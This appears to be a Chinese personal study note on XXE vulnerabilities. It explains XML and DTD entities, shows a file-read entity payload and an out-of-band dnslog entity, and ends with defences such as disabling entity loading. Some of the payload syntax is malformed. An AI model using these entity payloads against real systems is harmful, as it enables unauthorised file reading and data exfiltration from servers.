# XXE漏洞

## 前置知识

> 此处作简要的介绍具体需要后期学习

XXL 即`eXtensible Markup Language `可扩展标记语言

用于交换数据的, 也就是作数据传输用的

```
# XML格式
XML 文档必须有根元素
XML 文档必须有关闭标签(也就是说必须用双标签)
XML 标签对大小写敏感
XML 元素必须被正确嵌套
XML属性元素必须加单引号
```

> XML校验是ton过 DTD校验的,  DTD（Document Type Definition), 也就是文档类型型定
>
> 校验包括两部分, 一个是 **元素(ELEMENT)**, 另一个是 **实体(ENTITY)**
>
> 实体包括**内部实体(INTERNAL ENTITY)**和**外部实体(EXTERNAL ENTITY)**, 外部实体可以使用一些协议来调用外部的资源. 

| 协议 | 示例                                                       |
| ---- | ---------------------------------------------------------- |
| file | file:///etc//passwd                                        |
| php  | php://filter/read=convert.base64-encode/resource=index.php |
| http | http://aaa.com/evil.dtd                                    |
|      |                                                            |

| Libxml2 | pHP            |      | java    | .net  |
| ------- | -------------- | ---- | ------- | ----- |
| file    | file           |      | file    | file  |
| http    | http           |      | http    | http  |
| ftp     | ftp            |      | https   | https |
|         | compress.zlib  |      | ftp     | ftp   |
|         | compress.bzip2 |      | jar     |       |
|         | data           |      | netdoc  |       |
|         | glob           |      | mailto  |       |
|         | phar           |      | gopher* |       |
|         |                |      |         |       |

XML有的解析需要安装php的一些扩展才能解析php!!!.



## 什么是XXE

当网站访问的一些资源是XML进行传输的时候, 攻击者就可以通过构造 **能访问外部资源的外部实体, 达到任意读取 和操作一些信息的目的**

## 危害

1. 任意文件读取
2. 系统命令执行
3. 内网端口暴露
4. 直接攻击网站

## XXE实例

## 1. 直接显示

如果我们**检查源代码 或者 BP抓包**的时候, 发现如下形式, 那就说明网站使用了 **XML解析**, 那么久有可能存在XXE漏洞

```xm
# 检查源代码的时候, Request Payload 或者 工具BP 中显示的是标签的形式
<user>
	<username>
	*********
	</username>
	<passwrd>
	**********
	</passwrd>
</user>

```

那么我们只需要尝试在 BP抓包的时候, 添加外部实体, 就可能成功验证XXE漏洞啦!具体示例如下:

1. 原来在数据包中的显示

   ````
   # 这里是HTTP(s)协议内容
   # 协议后面有XML显示
   <user>
   	<username>
   	*********
   	</username>
   	<passwrd>
   	**********
   	</passwrd>
   </user>
   ````

   ```
   # 修改XML内容, 直接添加DTC就行
   <!DOCTYPE> a[
   	<!ENTITY> xxe SYSTEM"file:///C:Windows/system.ini">
   ]>
   <user>
   	<username>
   	********* &xxe; 
   	</username>
   	<passwrd>
   	**********
   	</passwrd>
   </user>
   ```

   **一定不要忘记在标签中引用常见的实例对象`&xxe;`**

   

## 2. 不直接(数据包中无回显)

很多时候即使网站使用了XML 进行数据解释, 但是仍然不会显示在数据包中, 这个时候攻击者就可以通过**搭建外部接口**或者**直接用dnslog**来进行验证. 注入的实体如下:

```
<?xml version = "1.0" encoding="UTF-8"?>
<!DOCTYPE root[
<!ENTITY %remote SYSTEM "http://aaabbb.xclg7k.dnslog.cn".
remote;]>![image-20230604203111963](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230604203111963.png)
```

​		![image-20230604203119410](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230604203119410.png)



## XXE 防御

1. 直接用WAF拦截(大多数的waf是需要付费的, 免费的waf可以试试, 例如: mode_secuirity)

```
https://github.com/SpiderLabs/ModSecurity.git
```

2. 直接手写拦截规则, 因为WAF本质就是将写好的规则进行验证, 所以个人感觉还是WAF好一些, 除非个人已经收集到了足够的拦截规则, 与WAF无异. 下面介绍几个过滤规则

   ```
   '
   ''
   ''(wto apostrophe)
   <
   >
   ]]>
   ]]>>
   <!--/-->
   /-->
   -->
   <!--
   <!-
   <!
   <![CDATA[/]]>
   ```

3. 直接关闭XML的外部引用, 因为那XXE的造成, 就是因为外部实体的引入, 如果不能引入外部实体, 那就不能不会引发了.

   ```
   # 下面的代码直接引入就可以了
   
   # php
   libxml_disable_entity_loader(true);
   
   # java
   DocumentBuilderFactory dbf
   =DocumentBuilderFactory.newInstance();
   dbf.setExpandEntityReferences(false);
   
   # python
   from lxml import etree
   xmlData =
   etree.parse(xmlSource,etree.XMLParser(resolve_entities=Fa
   lse))
   ```

   

## SSRF的区别

我的问答



